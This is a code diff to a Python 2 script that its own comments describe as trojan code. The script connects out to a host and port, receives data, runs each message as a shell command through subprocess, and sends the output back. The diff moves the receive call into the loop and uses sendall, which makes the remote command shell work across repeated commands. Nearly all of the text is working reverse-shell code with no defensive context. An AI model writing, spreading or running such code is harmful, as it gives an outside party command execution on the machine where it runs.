@@ -15,9 +15,6 @@ localIp = socket.gethostbyname(socket.gethostname())
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((target_host,target_port))
 
-# receive data from trojan
-response = client.recv(4096)
-
 #run command function
 def run_command(cmd):
     '''given shell command, returns communication tuple of stdout and stderr'''
@@ -25,7 +22,12 @@ def run_command(cmd):
                             stdout=subprocess.PIPE, 
                             stderr=subprocess.PIPE, 
                             stdin=subprocess.PIPE).communicate()
+
+# receive data from trojan
 while True:
+	response = client.recv(4096)
 	outputCommand =  run_command(response)[0]
-	client.send(outputCommand)
+	client.sendall(outputCommand)
 	print outputCommand
+
+
